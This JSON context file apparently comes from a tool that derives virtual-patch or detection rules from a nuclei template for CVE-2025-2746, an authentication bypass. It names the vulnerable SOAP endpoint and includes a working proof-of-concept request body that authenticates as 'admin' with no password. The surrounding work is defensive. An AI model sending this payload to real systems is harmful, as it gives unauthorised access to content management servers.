out/CVE-2025-2746/variant-context.json

{
  "template_id": "CVE-2025-2746",
  "template_path": "nuclei-templates/http/cves/2025/CVE-2025-2746.yaml",
  "classification": {
    "families": [
      "auth-bypass"
    ],
    "injection_point": "POST /CMSPages/Staging/SyncServer.asmx - SOAP XML body with wsse:UsernameToken (no password required); service processes request without authentication",
    "injection_slot": "REQUEST_BODY",
    "protocol": "http"
  },
  "payload_samples": [
    {
      "label": "poc",
      "content": "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Header><wsse:Security xmlns:wsse=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd\" xmlns:wsu=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\"><wsse:UsernameToken><wsse:Username>admin</wsse:Username></wsse:UsernameToken></wsse:Security></soap:Header><soap:Body><ProcessSynchronizationTaskData xmlns=\"http://localhost/SyncWebService/SyncServer\"><stagingTaskData><![CDATA[<test123abc>]]></stagingTaskData></ProcessSynchronizationTaskData></soap:Body></soap:Envelope>",
      "note": "SOAP XML body from template's raw request block; variable {{rand}} replaced with test123abc"
    }
  ],
  "paranoia": 2,
  "mode": "class-only",
  "targets": [],
  "scope_gate_decision": "virtual-patch-only"
}